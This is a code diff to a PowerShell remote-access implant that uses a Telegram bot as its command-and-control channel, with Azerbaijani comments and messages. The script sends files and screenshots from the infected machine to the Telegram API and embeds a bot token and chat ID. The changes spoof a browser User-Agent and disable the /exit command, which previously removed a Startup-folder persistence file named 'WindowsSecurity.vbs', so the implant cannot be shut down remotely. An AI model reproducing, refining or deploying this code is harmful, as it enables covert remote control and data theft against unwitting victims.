@@ -2,7 +2,6 @@ $token = "8817701294:AAGtc6EO7ln-vZ88RsH_IC76z5N5nmOzQLc"
 $chatId = "7432282760"
 $apiUrl = "https://api.telegram.org/bot$token"
 
-# --- Əvvəlki update ID-ni yaddaşdan oxu ---
 $stateFile = "$env:TEMP\last_update.txt"
 if (Test-Path $stateFile) {
     $lastUpdateId = [int](Get-Content $stateFile -Raw).Trim()
@@ -12,13 +11,11 @@ if (Test-Path $stateFile) {
 
 $currentDir = "C:\"
 
-# --- Köməkçi: mesaj göndər ---
 function Send-Message($text) {
     if ($text.Length -gt 4000) { $text = $text.Substring(0, 4000) + "... (kəsildi)" }
     try { Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -Body @{chat_id=$chatId; text=$text} -TimeoutSec 10 -ErrorAction Stop | Out-Null } catch {}
 }
 
-# --- Köməkçi: fayl göndər ---
 function Send-File($filePath) {
     if (-not (Test-Path $filePath)) { Send-Message "Xeta: Fayl tapilmadi - $filePath"; return }
     try {
@@ -39,7 +36,6 @@ function Send-File($filePath) {
     } catch { Send-Message "Xeta: $_" }
 }
 
-# --- Köməkçi: ekran şəkli ---
 function Send-Screenshot {
     try {
         Add-Type -AssemblyName System.Windows.Forms
@@ -69,17 +65,21 @@ function Send-Screenshot {
     } catch { Send-Message "Xeta: $_" }
 }
 
-# --- Başlanğıc mesajı ---
 Send-Message "C2 basladi: $env:COMPUTERNAME ($env:USERNAME) - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
 
-# --- Əsas dövrə ---
 while ($true) {
     try {
-        $updates = Invoke-RestMethod -Uri "$apiUrl/getUpdates?offset=$($lastUpdateId + 1)&timeout=30" -Method Get -TimeoutSec 40 -ErrorAction Stop
+        $wc = New-Object System.Net.WebClient
+        $wc.Proxy = $null
+        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
+        $response = $wc.DownloadString("$apiUrl/getUpdates?offset=$($lastUpdateId + 1)&timeout=10")
+        $updates = $response | ConvertFrom-Json
+        
         if ($updates.ok -and $updates.result.Count -gt 0) {
             foreach ($update in $updates.result) {
                 $lastUpdateId = $update.update_id
                 Set-Content -Path $stateFile -Value $lastUpdateId -Force
+                
                 if ("$($update.message.chat.id)" -eq "$chatId") {
                     $command = $update.message.text
                     if ([string]::IsNullOrWhiteSpace($command)) { continue }
@@ -160,12 +160,9 @@ Telegram C2 - Emrler:
                     }
 
                     if ($cmd -eq "/exit") {
-                        $startupFolder = [Environment]::GetFolderPath('Startup')
-                        $vbsPath = Join-Path $startupFolder "WindowsSecurity.vbs"
-                        Remove-Item $vbsPath -Force -ErrorAction SilentlyContinue
-                        Remove-Item $stateFile -Force -ErrorAction SilentlyContinue
-                        Send-Message "C2 dayandirilir, VBS startup-dan silindi"
-                        exit
+                        # Müvəqqəti olaraq söndürülüb
+                        Send-Message "exit əmri müvəqqəti olaraq söndürülüb"
+                        continue
                     }
 
                     try {
@@ -176,6 +173,8 @@ Telegram C2 - Emrler:
                 }
             }
         }
-    } catch { Start-Sleep -Seconds 10 }
-    Start-Sleep -Seconds 2
+    } catch {
+        Start-Sleep -Seconds 5
+    }
+    Start-Sleep -Seconds 1
 }
